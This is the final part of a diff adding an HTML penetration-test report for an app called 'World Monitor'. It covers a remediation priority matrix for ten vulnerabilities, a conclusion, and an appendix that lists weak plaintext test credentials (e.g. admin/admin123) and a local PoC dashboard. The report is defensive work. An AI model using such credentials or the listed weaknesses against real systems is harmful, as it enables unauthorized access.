+            <ul class="remediation-list">
+              <li>Use <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> cookies for session tokens.</li>
+              <li>Never store passwords or API keys client-side.</li>
+              <li>Implement token rotation and short expiry (15 min).</li>
+              <li>Clear stored tokens on logout and session expiry.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============================== 14. PRIORITY MATRIX ============================== -->
+  <section class="section" id="remediation">
+    <div class="section-header">
+      <span class="section-num">14</span>
+      <h2>Remediation Priority Matrix</h2>
+    </div>
+
+    <div class="callout warning">
+      <span class="callout-icon">⚡</span>
+      <div><strong>Action Required:</strong> P0 items must be remediated before any production deployment. P1 items should be addressed within the current development sprint.</div>
+    </div>
+
+    <table class="report-table">
+      <thead>
+        <tr><th>Priority</th><th>ID</th><th>Vulnerability</th><th>Effort</th><th>Risk Reduction</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><span class="priority-badge p0">P0 — Immediate</span></td>
+          <td><strong>V-005</strong></td>
+          <td>Remove Debug Endpoints</td>
+          <td>Low (1h)</td>
+          <td>Critical — Stops unauthenticated data leak</td>
+        </tr>
+        <tr>
+          <td><span class="priority-badge p0">P0 — Immediate</span></td>
+          <td><strong>V-009</strong></td>
+          <td>Hash Passwords + Remove from Responses</td>
+          <td>Medium (4h)</td>
+          <td>Critical — Protects all credentials</td>
+        </tr>
+        <tr>
+          <td><span class="priority-badge p0">P0 — Immediate</span></td>
+          <td><strong>V-001</strong></td>
+          <td>Strengthen JWT Secret &amp; Reduce Expiry</td>
+          <td>Low (1h)</td>
+          <td>Critical — Prevents token forgery</td>
+        </tr>
+        <tr>
+          <td><span class="priority-badge p0">P0 — Immediate</span></td>
+          <td><strong>V-006</strong></td>
+          <td>Implement RBAC &amp; Ownership Checks</td>
+          <td>Medium (8h)</td>
+          <td>Critical — Stops privilege escalation</td>
+        </tr>
+        <tr>
+          <td><span class="priority-badge p1">P1 — This Sprint</span></td>
+          <td><strong>V-003</strong></td>
+          <td>Parameterize SQL Queries</td>
+          <td>Medium (4h)</td>
+          <td>High — Prevents database compromise</td>
+        </tr>
+        <tr>
+          <td><span class="priority-badge p1">P1 — This Sprint</span></td>
+          <td><strong>V-007</strong></td>
+          <td>Sanitize Output + Add CSP</td>
+          <td>Low (2h)</td>
+          <td>High — Prevents client-side attacks</td>
+        </tr>
+        <tr>
+          <td><span class="priority-badge p1">P1 — This Sprint</span></td>
+          <td><strong>V-002</strong></td>
+          <td>Add Rate Limiting + Fix Enumeration</td>
+          <td>Medium (4h)</td>
+          <td>High — Stops brute-force attacks</td>
+        </tr>
+        <tr>
+          <td><span class="priority-badge p2">P2 — Next Sprint</span></td>
+          <td><strong>V-008</strong></td>
+          <td>Add Security Headers (helmet.js)</td>
+          <td>Low (30min)</td>
+          <td>Medium — Defense in depth</td>
+        </tr>
+        <tr>
+          <td><span class="priority-badge p2">P2 — Next Sprint</span></td>
+          <td><strong>V-004</strong></td>
+          <td>Restrict CORS to Trusted Origins</td>
+          <td>Low (1h)</td>
+          <td>Medium — Prevents cross-origin abuse</td>
+        </tr>
+        <tr>
+          <td><span class="priority-badge p3">P3 — Backlog</span></td>
+          <td><strong>V-010</strong></td>
+          <td>Migrate to HttpOnly Cookies</td>
+          <td>Low (2h)</td>
+          <td>Low — Reduces XSS impact</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="callout success">
+      <span class="callout-icon">✅</span>
+      <div><strong>Estimated Total Remediation Effort:</strong> ~27 hours of development work to address all 10 vulnerabilities. P0 items (most critical) require approximately 14 hours.</div>
+    </div>
+  </section>
+
+  <!-- ============================== 15. CONCLUSION ============================== -->
+  <section class="section" id="conclusion">
+    <div class="section-header">
+      <span class="section-num">15</span>
+      <h2>Conclusion</h2>
+    </div>
+
+    <div class="prose">
+      <p>The security assessment of the World Monitor application has revealed <strong>significant and systemic security weaknesses</strong> across authentication, authorization, input validation, API security, and data protection mechanisms.</p>
+
+      <p>The four critical vulnerabilities (V-001, V-003, V-005, V-006) collectively create multiple independent paths to complete system compromise — requiring minimal technical skill to exploit. Of particular concern:</p>
+      
+      <p>
+        • <strong>V-005</strong> exposes all infrastructure credentials <em>without any authentication</em><br>
+        • <strong>V-006</strong> allows any user to escalate to administrator<br>
+        • <strong>V-001</strong> enables forging authentication tokens<br>
+        • <strong>V-003</strong> allows direct database manipulation
+      </p>
+
+      <p>These vulnerabilities are not theoretical — each has been validated with a working proof of concept in the testing environment. The application in its current form <strong>is not suitable for production deployment</strong> and should undergo comprehensive security hardening following the priority matrix outlined in this report.</p>
+
+      <p><strong>Recommended next steps:</strong></p>
+      <p>
+        1. Address all P0 vulnerabilities immediately (~14 hours estimated)<br>
+        2. Schedule P1 remediation for the current sprint<br>
+        3. Conduct a follow-up security assessment after remediation<br>
+        4. Implement automated security testing in the CI/CD pipeline<br>
+        5. Establish a regular security review cadence (quarterly)
+      </p>
+    </div>
+  </section>
+
+  <!-- ============================== 16. APPENDIX ============================== -->
+  <section class="section" id="appendix">
+    <div class="section-header">
+      <span class="section-num">16</span>
+      <h2>Appendix</h2>
+    </div>
+
+    <h3 style="font-size:1.05rem; margin-bottom:14px; color:var(--text)">A. Test Environment</h3>
+    <table class="report-table">
+      <tbody>
+        <tr><td><strong>Application</strong></td><td>World Monitor v2.4.1</td></tr>
+        <tr><td><strong>Server</strong></td><td>Node.js + Express.js on localhost:3000</td></tr>
+        <tr><td><strong>Test Date</strong></td><td>September 28, 2026</td></tr>
+        <tr><td><strong>Testing Type</strong></td><td>White-box + Black-box (combined approach)</td></tr>
+        <tr><td><strong>Standards Applied</strong></td><td>OWASP Top 10, CVSS 3.1, CWE Database</td></tr>
+      </tbody>
+    </table>
+
+    <h3 style="font-size:1.05rem; margin: 24px 0 14px; color:var(--text)">B. Test Credentials Used</h3>
+    <table class="report-table">
+      <thead><tr><th>Username</th><th>Password</th><th>Role</th></tr></thead>
+      <tbody>
+        <tr><td><code>admin</code></td><td><code>admin123</code></td><td>Administrator</td></tr>
+        <tr><td><code>analyst</code></td><td><code>analyst2024</code></td><td>Analyst</td></tr>
+        <tr><td><code>viewer</code></td><td><code>viewer123</code></td><td>Viewer (lowest)</td></tr>
+        <tr><td><code>manager</code></td><td><code>manager!</code></td><td>Manager</td></tr>
+      </tbody>
+    </table>
+
+    <h3 style="font-size:1.05rem; margin: 24px 0 14px; color:var(--text)">C. Interactive PoC Dashboard</h3>
+    <div class="callout info">
+      <span class="callout-icon">🔒</span>
+      <div>
+        A live interactive PoC testing dashboard is available at <strong>http://localhost:3000/security-dashboard</strong> when the application is running. It allows executing all 10 vulnerability tests with real-time API calls and viewing detailed exploitation output.
+      </div>
+    </div>
+
+    <h3 style="font-size:1.05rem; margin: 24px 0 14px; color:var(--text)">D. OWASP Top 10 Mapping</h3>
+    <table class="report-table">
+      <thead><tr><th>OWASP Category</th><th>Finding(s)</th></tr></thead>
+      <tbody>
+        <tr><td><strong>A01:2021 — Broken Access Control</strong></td><td>V-006 (IDOR + Missing RBAC), V-004 (CORS)</td></tr>
+        <tr><td><strong>A02:2021 — Cryptographic Failures</strong></td><td>V-001 (Weak JWT), V-009 (Plaintext passwords)</td></tr>
+        <tr><td><strong>A03:2021 — Injection</strong></td><td>V-003 (SQL Injection), V-007 (XSS)</td></tr>
+        <tr><td><strong>A04:2021 — Insecure Design</strong></td><td>V-005 (Debug endpoints), V-008 (Missing headers)</td></tr>
+        <tr><td><strong>A05:2021 — Security Misconfiguration</strong></td><td>V-004 (CORS), V-008 (Headers), V-005 (Debug)</td></tr>
+        <tr><td><strong>A07:2021 — Identification &amp; Auth Failures</strong></td><td>V-001 (JWT), V-002 (No rate limit), V-009 (Weak creds)</td></tr>
+        <tr><td><strong>A08:2021 — Data Integrity Failures</strong></td><td>V-010 (Insecure storage)</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- ============================== FOOTER ============================== -->
+  <footer class="report-footer">
+    <p><strong>World Monitor — Security Assessment Report</strong></p>
+    <p>Classification: CONFIDENTIAL | September 28, 2026</p>
+    <p style="margin-top:12px; font-size:0.75rem; color:var(--text-3)">
+      This report was generated as part of an authorized security assessment.<br>
+      All testing was conducted in compliance with applicable laws, policies, and ethical hacking guidelines.
+    </p>
+  </footer>
+
+</div>
+
+</body>
+</html>
